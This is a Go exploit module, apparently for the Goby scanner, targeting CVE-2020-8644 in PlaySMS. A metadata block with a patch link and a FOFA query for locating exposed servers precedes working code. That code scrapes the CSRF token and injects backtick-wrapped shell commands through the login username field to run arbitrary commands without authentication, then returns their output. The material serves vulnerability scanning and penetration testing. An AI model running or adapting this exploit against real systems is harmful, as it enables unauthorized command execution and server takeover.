package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"math/rand"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PlaySMS Location Unauthenticated Remote Code Execution vulnerability (CVE-2020-8644)",
    "Description": "<p>An input validation error vulnerability existed in PlaySMS versions prior to 1.4.3, which was caused by the program not sanitizing malicious strings. An attacker could exploit this vulnerability to execute arbitrary code.</p>",
    "Impact": "<p>PlaySMS Unauthenticated Remote Code Execution vulnerability (CVE-2020-8644)</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704\">https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704</a></p>",
    "Product": "PlaySMS",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "PlaySMS Location 重定向未认证远程代码执行漏洞（CVE-2020-8644）",
            "Product": "PlaySMS",
            "Description": "<p>PlaySMS 1.4.3之前版本中存在输入验证错误漏洞，该漏洞源于程序没有清理恶意的字符串。攻击者可利用该漏洞执行任意代码。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：</p><p><a href=\"https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704\">https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704</a></p><p></p><p><a href=\"https://www.eq-3.de\"></a></p><p><a target=\"_Blank\" href=\"https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj\"></a></p><p></p><p><a href=\"https://github.com/getgrav/grav-plugin-admin/security/advisories/GHSA-6f53-6qgv-39pj\"></a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "PlaySMS Location Unauthenticated Remote Code Execution vulnerability (CVE-2020-8644)",
            "Product": "PlaySMS",
            "Description": "<p>An input validation error vulnerability existed in PlaySMS versions prior to 1.4.3, which was caused by the program not sanitizing malicious strings. An attacker could exploit this vulnerability to execute arbitrary code.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch:</p><p><a href=\"https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704\">https://forum.playsms.org/t/playsms-1-4-3-has-been-released/2704</a></p>",
            "Impact": "<p>PlaySMS Unauthenticated Remote Code Execution vulnerability (CVE-2020-8644)</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "body=\"index.php?app=main&inc=core_auth&route=login&op=login\" || body=\"plugin/themes/common/jscss/\"",
    "GobyQuery": "body=\"index.php?app=main&inc=core_auth&route=login&op=login\" || body=\"plugin/themes/common/jscss/\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://playsms.org/",
    "DisclosureDate": "2020-02-05",
    "References": [
        "https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2020-8644"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202002-145"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10489"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			r1 := rand.Intn(99999 - 10000)
			r2 := rand.Intn(999999 - 100000)
			r3 := r1 + r2
			cfg := httpclient.NewGetRequestConfig("/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 302 {
					regRule := regexp.MustCompile(`(https?://[^/]+/)?(.*?\.php)`)
					loginUri := "/" + regRule.FindAllStringSubmatch(resp.Header.Get("Location"), -1)[0][2] + "?app=main&inc=core_auth&route=login"
					if resp, err := httpclient.SimpleGet(u.FixedHostInfo + loginUri); err == nil {
						log.Println(resp.StatusCode)
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "X-CSRF-Token") {
							token := regexp.MustCompile(`name="X-CSRF-Token" value="(.*?)"`).FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
							postData := fmt.Sprintf("X-CSRF-Token=%s&username=%%7B%%7B%%60expr%%20%d%%20%%2B%%20%d%%60%%7D%%7D&password=%d", token, r1, r2, r1)
							cfg := httpclient.NewPostRequestConfig(loginUri)
							cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cfg.VerifyTls = false
							cfg.FollowRedirect = true
							cfg.Data = postData
							if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
								return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, fmt.Sprintf("%d", r3))
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			r1 := rand.Intn(99999 - 10000)
			cfg := httpclient.NewGetRequestConfig("/")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 302 {
					regRule := regexp.MustCompile(`(https?://[^/]+/)?(.*?\.php)`)
					loginUri := "/" + regRule.FindAllStringSubmatch(resp.Header.Get("Location"), -1)[0][2] + "?app=main&inc=core_auth&route=login"
					if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + loginUri); err == nil {
						log.Println(resp.StatusCode)
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "X-CSRF-Token") {
							token := regexp.MustCompile(`name="X-CSRF-Token" value="(.*?)"`).FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
							postData := fmt.Sprintf("X-CSRF-Token=%s&username=%%7B%%7B%%60%s%%60%%7D%%7D&password=%d", token, cmd, r1)
							cfg := httpclient.NewPostRequestConfig(loginUri)
							cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cfg.VerifyTls = false
							cfg.FollowRedirect = true
							cfg.Data = postData
							if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
								if resp.StatusCode == 200 {
									expResult.Success = true
									cmdResult := regexp.MustCompile(`name=username value='(?s)(.*?)'`).FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
									expResult.Output = cmdResult
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
